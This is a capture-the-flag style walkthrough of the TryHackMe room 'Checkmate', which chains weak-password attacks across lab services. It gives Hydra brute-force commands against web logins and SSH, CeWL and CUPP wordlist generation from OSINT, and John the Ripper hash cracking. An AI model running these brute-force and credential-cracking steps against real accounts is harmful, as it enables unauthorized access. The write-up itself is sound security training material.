**Written by Aryan Giri**

## Overview

**Checkmate** is a premium TryHackMe room focused on weak password hygiene across multiple internal services belonging to Marco Bianchi. The scenario demonstrates how password reuse and predictable patterns can lead to full compromise when combined with OSINT and targeted brute-force techniques.

The exercise simulates a chained internal environment: firewall console, employee portal, social platform, and SSH access.

## Room Goal

The objective is to move laterally through services and recover each successive password using weak-password discovery, OSINT gathering, and pattern-based cracking.

## What was exposed

Marco reused weak and predictable passwords across multiple services. Key leaks included:

* Default-style firewall login portal
* Employee profile information on internal portal
* Social media activity and personal details
* Password pattern disclosure on social.thm
* SSH access protected by a predictable rule-based password

## Setup

Before starting, configure local hostname resolution:

```bash
sudo nano /etc/hosts
```

Add the following entry:

```txt
<Your Target Machine IP>    firewall.thm jobs.thm social.thm
```

## Level-by-Level Walkthrough

### Level 1 — Firewall Console

The first target was a firewall login interface at `firewall.thm:5001`, returning a generic `Invalid credentials` response. The page source contained a simple Bootstrap-based form with no CSRF protection or additional hardening indicators.

A direct Hydra attack against the login endpoint successfully retrieved the password without requiring advanced enumeration.

### Practical Steps

1. Inspect the page source for hidden endpoints or form structure.
2. Intercept a login request using Burp Suite with invalid credentials.
3. Identify:

   * POST endpoint
   * Parameter names (e.g., username, password)
   * Failure response message
4. Test default credentials if applicable.
5. Launch Hydra only after validating request structure.

### Commands Used

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt firewall.thm -s 5001 http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"
```

Recovered password:

```txt
12***
```

---

### Level 2 — Employee Portal

The employee portal at `jobs.thm:5002` exposed internal user data. The page source revealed a username hint (`marco`), enabling a more focused attack.

CeWL was used to generate a custom wordlist from the portal content.

### Practical Steps

1. Analyze page source and identify username hints.
2. Crawl the application using CeWL.
3. Generate a targeted wordlist.
4. Run Hydra against the login endpoint.

### Commands Used

```bash
cewl --depth 2 --with-numbers --write cewl.txt http://jobs.thm:5002/
```

```bash
hydra -l marco -P cewl.txt jobs.thm -s 5002 http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"
```

Recovered password:

```txt
exce******
```

---

### Level 3 — Social Platform Login

The employee profile leaked OSINT data including:

* Full name: Marco Bianchi
* Username: marky
* Birthdate: 14021995
* Department: IT Operations
* Base password theme: excellence

This data was sufficient to build a custom CUPP-generated wordlist.

### Practical Steps

1. Extract OSINT data from profile.
2. Generate password candidates using CUPP.
3. Build targeted wordlist.
4. Attack login endpoint with Hydra.

### Commands Used

```bash
cupp -i
```

```bash
hydra -l marco -P marco.txt social.thm -s 5003 http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"
```

Recovered password:

```txt
Bian*******
```

---

### Level 4 — Uploaded File Hash Challenge

The platform exposed uploaded profile images stored using SHA256 hashes of original filenames:

```txt
(SHA256).png
```

The uploaded file was accessible at:

```txt
http://social.thm:5003/uploads/d34a569ab7aaa54dacd715ae64953455d86b768846cd0085ef4e9e7471489b7b.png
```

### Practical Steps

1. Extract SHA256 hash from uploaded filename.
2. Store hash in a file.
3. Attempt brute-force of original filename using John the Ripper incremental mode.
4. Verify result using `john --show`.

### Commands Used

```bash
echo "d34a569ab7aaa54dacd715ae64953455d86b768846cd0085ef4e9e7471489b7b" > hash.txt
```

```bash
john --incremental --format=Raw-SHA256 hash.txt
```

```bash
john --show --format=Raw-SHA256 hash.txt
```

Recovered filename via hash cracking.

---

### Level 5 — Pattern-Based Password Disclosure

A public post on the social platform revealed Marco’s password pattern:

> I take a company keyword, capitalize it, then append a number/year and an exclamation mark.

Leaked keywords:

* security
* excellence
* innovation
* digital
* cloud

Password format:

```txt
CapitalizedKeyword + Year/Number + !
```

### Practical Steps

1. Analyze leaked pattern carefully.
2. Generate candidate passwords.
3. Create targeted SSH wordlist.
4. Perform SSH brute-force attack using Hydra.

### Commands Used

```bash
cat > ssh.txt << EOF
Security2024!
Excellence2024!
Innovation2024!
Digital2024!
Cloud2024!
Security2025!
Excellence2025!
Innovation2025!
Digital2025!
Cloud2025!
EOF
```

```bash
hydra -l marco -P ssh.txt ssh://10.128.170.6
```

Recovered password:

```txt
Secu********
```

---

## Key Takeaways

Checkmate demonstrates how weak password hygiene compounds across multiple services.

Core lessons:

* Default credentials remain a critical attack surface
* OSINT can directly translate into password candidates
* Password reuse enables multi-service compromise
* Public posts often leak deterministic password patterns

The full compromise was achieved through enumeration, OSINT, and targeted brute-force chaining rather than blind attacks.
